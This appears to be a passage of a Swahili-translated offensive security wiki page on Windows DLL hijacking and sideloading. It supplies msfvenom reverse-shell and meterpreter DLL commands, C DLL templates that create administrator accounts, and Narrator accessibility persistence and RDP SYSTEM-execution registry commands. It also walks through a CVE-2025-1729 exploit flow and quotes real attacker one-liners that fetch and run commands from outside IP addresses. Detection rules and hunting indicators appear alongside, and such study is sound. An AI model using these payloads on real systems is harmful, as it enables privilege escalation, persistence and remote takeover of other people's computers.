Zana nyingine za kiotomatiki zinazofaa kwa kugundua udhaifu huu ni **functions za PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukikuta hali inayoweza kutumiwa, mojawapo ya mambo muhimu zaidi ya kufanya ili kuitumia kwa mafanikio ni **kuunda DLL inayotoa angalau functions zote ambazo executable ita-import kutoka kwayo**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kusaidia [kuongeza kutoka kiwango cha Medium Integrity hadi High **(kwa kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda DLL halali** ndani ya utafiti huu wa DLL hijacking unaolenga DLL hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** utapata baadhi ya **msimbo wa msingi wa DLL** unaoweza kuwa muhimu kama **templates** au kwa kuunda **DLL ambayo ime-export functions zisizohitajika**.

## **Kuunda na ku-compile DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kuendesha msimbo wako hasidi inapopakiwa**, lakini pia **kuonyesha** na **kufanya kazi** kama **inavyotarajiwa** kwa **kuelekeza upya calls zote kwenye library halisi**.

Ukitumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kuonyesha executable na kuchagua library** unayotaka ku-proxify na **kutengeneza DLL iliyoproxifyiwa**, au **kuonyesha DLL** na **kutengeneza DLL iliyoproxifyiwa**.

### **Meterpreter**

**Pata rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86 sikuona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Katika hali nyingi, DLL unayokompile lazima **iexport kila function inayoimportiwa na process lengwa**. Export inayohitajika ikikosekana, binary haiwezi kuitatua na exploit hushindwa.

<details>
<summary>Template ya C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Mfano wa DLL ya C++ wenye uundaji wa mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL mbadala ya C yenye entry point ya thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL ya NativeAOT yenye uanzishaji unaochochewa na export

**Maktaba ya pamoja ya .NET NativeAOT inayojitosheleza** inaweza kutumika kama DLL ya native iliyopandikizwa bila kutekeleza `DllMain` kwa uwazi. Export mbinu tuli za C# kwa `[UnmanagedCallersOnly(EntryPoint = "...")]`; host ya native inapoitisha mojawapo ya entry point zinazozalishwa na compiler, NativeAOT huanzisha moduli na mbinu ya `[ModuleInitializer]` huendeshwa kabla ya mwili wa C# uli-exportiwa. Matokeo hayahitaji runtime ya .NET iliyosakinishwa kando.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL bado inahitaji **majina ya export na signatures zinazooana na ABI** ambazo host iliyochaguliwa huiita. Stubs za chini kabisa zinaweza kutosha kuchochea uanzishaji, lakini export zinazokosekana zinaweza kuzuia upakiaji, na signature isiyo sahihi inaweza kuharibu call. Orodhesha imports za host na uthibitishe matokeo kwa `dumpbin /exports payload.dll` kabla ya kubadilisha jina la matokeo liwe jina la dependency linalotarajiwa na host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL ya NativeAOT yenye export za msingi</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Sanidi mradi kama maktaba ya pamoja ya Windows ya asili inayojitosheleza:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Weka DLL iliyopewa jina jipya kando ya executable iliyonakiliwa iliyo hatarini, kisha anzisha programu mwenyeji kupitia njia ya msimbo inayopiga export inayolingana. Mbinu hii ya initializer huepusha kuweka kazi changamano moja kwa moja ndani ya `DllMain`, lakini masharti ya awali ya sideload hayabadiliki: loader lazima itatue dependency kwa jina, ichague saraka ya programu, na isitosheleze dependency hiyo kwanza kupitia KnownDLLs, module ambayo tayari imepakuliwa, uelekezaji upya wa SxS, au bendera zilizowekewa vikwazo za `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Kwa template za kawaida za native, tazama [Windows C payloads](../windows-c-payloads.md). Hatua ya kwanza iliyosideloadiwa inaweza baadaye kutekeleza [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), lakini hiyo ni mbinu tofauti ya injection, si sehemu ya utatuzi wa DLL.

## Ugunduzi: upakiaji wa library kupitia DLL masquerading

Elastic Defend 9.5.0 huongeza maelezo kwenye tukio la library-load kwa `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` wakati faili iliyopakiwa haijasainiwa na Microsoft na jina lake la faili linagongana na orodha iliyohifadhiwa kwenye cache ya Elastic ya majina ya Windows/system DLL. Hii huhamishia uchanganuzi wa orodha ya majina ya faili, eneo la mfumo na sahihi ya kidijitali kwenye kihisi cha endpoint; kwa hiyo, EQL kuu inaweza kurahisishwa kuwa:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Chukulia enrichment kama kidokezo muhimu cha kufuatilia, si uthibitisho wenyewe. Ongeza kiwango cha uhakika wakati host iliyosainiwa inapakia DLL kutoka kwenye saraka yake yenyewe **inayoweza kuandikiwa na mtumiaji**, DLL haijasainiwa/si ya kuaminika, na `dll.Ext.relative_file_creation_time` inaonyesha kuwa iliundwa muda mfupi kabla ya kupakiwa. Weka vizuizi kwa mchanganyiko sahihi wa publisher + mchakato wa host + njia ya usakinishaji; usizuie jina la DLL linalogongana kila mahali, kwa kuwa installers na applications halali zinaweza kujumuisha maktaba za binafsi zenye majina yanayofanana na ya mfumo.<sup>[[26]](#references)</sup>

Kwenye sensors zisizo na enrichment hiyo, kadiria tabia hiyo kwa kuoanisha jina la DLL linalogongana na njia ya kupakia isiyo ya mfumo, kutokuwepo kwa sahihi ya Microsoft/kuwepo kwa sahihi isiyoaminika, na muda mfupi kati ya uundaji wa faili na upakiaji. Hili linahitaji orodha ya majina ya DLL inayodumishwa na vizuizi finyu kwa `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS`, na njia nyingine zilizoidhinishwa za deployment.<sup>[[26]](#references)</sup>

## Uchunguzi wa Kesi: DLL Hijack ya Narrator OneCore TTS Localization (Accessibility/ATs)

Windows Narrator.exe bado hukagua DLL ya localization inayotabirika na mahususi kwa lugha inapoanza; DLL hii inaweza kutekwa nyara ili kutekeleza arbitrary code na kupata persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia inayokaguliwa (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (build za zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na inayodhibitiwa na mshambuliaji ipo kwenye njia ya OneCore, itapakiwa na `DllMain(DLL_PROCESS_ATTACH)` itatekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa Procmon
- Kichujio: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ya chini kabisa
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Ukimya wa OPSEC
- Utekaji nyara wa kijuujuu utatoa sauti/kuangazia UI. Ili usionekane, wakati wa attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Kuchochea na kudumisha kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mipangilio iliyo hapo juu, kuanzisha Narrator kutapakia DLL iliyopandikizwa. Kwenye desktop salama (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye desktop salama.

Utekelezaji wa SYSTEM unaochochewa na RDP (uhamaji wa pembeni)
- Ruhusu safu ya usalama ya kawaida ya RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye desktop salama.
- Utekelezaji husimama kipindi cha RDP kinapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kuiga ingizo la registry la Accessibility Tool (AT) iliyojengewa ndani (k.m., CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kuliingiza, kisha kuweka `configuration` iwe jina la AT hiyo. Hii huruhusu utekelezaji wowote kupitia mfumo wa Accessibility.

Vidokezo
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwa ndani ya `DLL_PROCESS_ATTACH`; exports hazihitajiki.

## Uchunguzi wa Kisa: CVE-2025-1729 - Kupandisha Haki kwa Kutumia TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Athari

- **Kipengele**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu watumiaji wa ndani kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Huanzisha jaribio la kupakia `hostfxr.dll` kutoka kwenye saraka yake ya kufanya kazi kwanza na huandika "NAME NOT FOUND" kwenye log ikiwa haipo, ikionyesha kuwa utafutaji wa saraka ya ndani una kipaumbele.

### Utekelezaji wa Exploit

Mshambulizi anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, akitumia DLL inayokosekana kutekeleza code katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyoratibiwa iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi hiyo inatekelezwa, DLL hasidi huendeshwa katika kipindi cha msimamizi chenye medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kupata haki za SYSTEM kutoka medium integrity.

## Uchunguzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Wahusika wa vitisho mara nyingi huunganisha droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliotiwa saini.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (k.m., kitendo cha LaunchApplication au VBScript), na kuunda upya hatua inayofuata kutoka kwenye embedded resources.
- Dropper huandika EXE halali iliyotiwa saini na DLL hasidi kwenye saraka ileile (jozi ya mfano: wsc_proxy.exe iliyotiwa saini na Avast + wsc.dll inayodhibitiwa na mshambulizi).
- EXE iliyotiwa saini inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye working directory, na kutekeleza msimbo wa mshambulizi chini ya mchakato mkuu uliotiwa saini (ATT&CK T1574.001).

Uchambuzi wa MSI (mambo ya kuchunguza)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo wa kutiliwa shaka: LaunchApplication inayoendesha faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zilizogawanywa kwenye MSI CAB:
  - Toa faili kwa utaratibu wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande kadhaa vidogo vinavyounganishwa na kusimbuliwa na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading kwa kutumia wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
  - wsc.dll: DLL ya mshambuliaji. Ikiwa exports mahususi hazihitajiki, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye maktaba halisi huku ukiendesha payload ndani ya DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia hutekeleza payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), huenda hijack ikashindwa.
- KnownDLLs, SxS na forwarded exports zinaweza kuathiri mpangilio wa kipaumbele, na ni lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Signed triads + payloads zilizosimbwa kwa njia fiche (uchunguzi wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon inavyotumia **triad ya faili tatu** kusambaza ShadowPad, kujificha miongoni mwa software halali huku ikihifadhi payload kuu ikiwa imesimbwa kwa njia fiche kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE host iliyosainiwa** – wauzaji kama AMD, Realtek au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini saini ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Kwa kawaida DLL ni binary ya MFC iliyofichwa kwa kutumia framework ya ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa kwa njia fiche, kuiondoa usimbaji huo, na kumap ShadowPad kwa njia ya reflective.
3. **Blob ya payload iliyosimbwa kwa njia fiche** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye saraka hiyo hiyo. Baada ya kumap payload iliyofutwa usimbaji wake kwenye memory, loader hufuta faili ya TMP ili kuharibu ushahidi wa forensic.

Vidokezo kuhusu tradecraft:

* Kubadilisha jina la EXE iliyosainiwa (huku jina la awali la `OriginalFileName` likibaki kwenye kichwa cha PE) huiwezesha kujifanya binary ya Windows huku ikihifadhi saini ya muuzaji. Kwa hiyo, iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` lakini kwa kweli ni utilities za AMD/NVIDIA.
* Kwa kuwa executable hubaki trusted, vidhibiti vingi vya allowlisting vinahitaji tu DLL yako hasidi iwekwe kando yake. Lenga kubinafsisha loader DLL; kwa kawaida parent iliyosainiwa inaweza kuendeshwa bila kuibadilisha.
* Decryptor ya ShadowPad inahitaji blob ya TMP iwe karibu na loader na iweze kuandikwa ili iweze kuandika sifuri kwenye faili baada ya mapping. Acha saraka iweze kuandikwa hadi payload ipakie; ikiwa kwenye memory, faili ya TMP inaweza kufutwa kwa usalama kwa OPSEC.

### Mnyororo wa LOLBAS stager + sideloading ya staged archive (finger → tar/curl → WMI)

Waendeshaji huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum kwenye diski iwe DLL hasidi iliyo karibu na EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, huvuta commands kutoka kwa server ya Finger, na kuzituma kupitia pipe hadi `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupata maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la server, na kuwawezesha operators kubadilisha second stage upande wa server.

- **Upakuaji/uchimbuaji uliojengewa ndani:** Pakua archive yenye extension isiyo na madhara, ifungue, na uweke sideload target pamoja na DLL chini ya folder ya `%LocalAppData%` iliyochaguliwa bila mpangilio:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha taarifa za maendeleo na hufuata redirects; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **Uzinduzi wa WMI/CIM:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM wakati inapakia DLL iliyo kwenye saraka hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea DLL za ndani (mf., `intelbq.exe`, `nearby_share.exe`); payload (mf., Remcos) huendeshwa chini ya jina linaloaminika.

- **Uwindaji:** Weka tahadhari kwa `forfiles` pale `/p`, `/m`, na `/c` zinapoonekana pamoja; hali hii si ya kawaida nje ya scripts za admin.


## Uchunguzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uingiliaji wa hivi karibuni wa Lotus Blossom ulitumia vibaya mnyororo wa update unaoaminika kuwasilisha dropper iliyofungwa kwa NSIS, ambayo iliandaa DLL sideload pamoja na payloads zilizokuwa kwenye memory kikamilifu.<sup>[[13]](#references)</sup>

Mtiririko wa mbinu
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, hudondosha Bitdefender Submission Wizard `BluetoothService.exe` iliyopewa jina jipya, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- EXE ya host hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huifungua kwa kutumia mkondo maalum wa LCG (constanti **0x19660D** / **0x3C6EF35F**, nyenzo za key zilizotokana na hash ya awali), huandika shellcode ya maandishi wazi juu ya buffer, huachilia temps, kisha hurukia humo.
- Ili kuepuka IAT, loader hutatua APIs kwa ku-hash majina ya exports kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha hutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha matokeo na target hashes zenye salt.

Shellcode kuu (Chrysalis)
- Hufungua module kuu inayofanana na PE kwa kurudia add/XOR/sub kwa kutumia key `gQ2JR&9;` katika passes tano, kisha hupakia `Kernel32.dll` → `GetProcAddress` ili kukamilisha utatuzi wa imports.
- Huunda upya mifuatano ya majina ya DLL wakati wa runtime kupitia mabadiliko ya bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la exports katika blocks za baiti 4 kwa kutumia Murmur-style mixing, na hutumia `GetProcAddress` tu ikiwa hash haijapatikana.

Usanidi uliopachikwa na C2
- Config iko ndani ya faili ya `BluetoothService` iliyodondoshwa, kwenye **offset 0x30808** (size **0x980**), na hufunguliwa kwa RC4 kwa kutumia key `qwhvb^435h&*7`, kufichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huweka tag `4Q` mwanzoni, kisha huusimba kwa RC4 kwa kutumia key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hufunguliwa kwa RC4 na kuelekezwa kulingana na tag switch (`4T` shell, `4V` utekelezaji wa process, `4W/4X` uandishi wa faili, `4Y` usomaji/utoaji wa data, `4\\` uondoaji, `4` uorodheshaji wa drive/faili + hali za uhamishaji wa data kwa vipande).
- Hali ya utekelezaji inadhibitiwa na CLI args: bila args = kusakinisha persistence (service/Run key) inayoelekeza kwa `-i`; `-i` huzindua upya yenyewe kwa kutumia `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyoonekana
- Uingiliaji huohuo ulidondosha Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa pembeni yake. C source iliyotolewa na mshambuliaji ilikuwa na shellcode iliyopachikwa, ikakusanywa na kuendeshwa kwenye memory bila kuweka PE kwenye diski. Iigeuze kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya compile-and-run inayotumia TCC iliingiza `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja, na hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa uendeshaji wa compiler.

## DLL sideloading kwenye host iliyosainiwa kwa export proxying + thread parking ya host

Baadhi ya misururu ya DLL sideloading huongeza **uimarishaji wa uthabiti** ili host halali ibaki inaendeshwa kwa muda wa kutosha kupakia hatua za baadaye kwa usahihi, badala ya ku-crash baada ya DLL hasidi kupakiwa.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka EXE inayoaminika kando ya DLL hasidi, ukitumia jina la dependency linalotarajiwa kama `version.dll`.
- DLL hasidi **hufanya proxy ya kila export inayotarajiwa** kurudi kwenye DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hupatch entry point ya host** ili thread kuu iingie kwenye kitanzi kisichoisha cha `Sleep` badala ya kutoka au kutekeleza njia za code ambazo zingesitisha mchakato.
- Thread mpya hufanya kazi hasidi yenyewe: kusimbua jina au njia ya DLL ya hatua inayofuata (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kufanya proxy ya kawaida ya DLL hudumisha uoanifu wa API, lakini hakuhakikishi kuwa host itabaki inaendeshwa kwa muda wa kutosha kwa hatua za baadaye.
- Kuweka thread kuu kwenye `Sleep(INFINITE)` ni njia rahisi ya kuacha mchakato uliosainiwa ukiendelea kuwepo huku loader ikifanya usimbuaji, staging, au bootstrap ya mtandao kwenye thread ya worker.
- Kuwinda `DllMain` inayotiliwa shaka pekee hukosa muundo huu ikiwa tabia inayovutia hutokea baada ya entry point ya host kupatchiwa na thread ya pili kuanza.

Mtiririko wa chini kabisa wa kazi
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayopakiwa kutoka kwenye directory ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuziforward kwenye DLL halali.
3. Ndani ya `DllMain(DLL_PROCESS_ATTACH)`, tengeneza thread ya worker.
4. Kutoka kwenye thread hiyo, patch entry point ya host au routine ya kuanzia ya thread kuu ili izunguke kwenye `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au ufanye manual-map ya payload.

Viashiria vya ulinzi
- Michakato iliyosainiwa inayopakia `version.dll` au maktaba nyingine za kawaida zinazofanana kutoka kwenye application directory yake badala ya `System32`.
- Memory patches kwenye entry point ya mchakato muda mfupi baada ya kupakia image, hasa jumps/calls zinazoelekezwa kwenye `Sleep`/`SleepEx`.
- Threads zinazoundwa na proxy DLL ambazo huita `LoadLibrary` mara moja kwa DLL ya pili yenye jina lililosimbuliwa.
- Proxy DLL zenye exports zote, zilizowekwa kando ya executables za vendor ndani ya staging directories zinazoweza kuandikiwa kama `ProgramData`, `%TEMP%`, au njia za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya Ujasusi: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kuongeza Haki kwa Kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
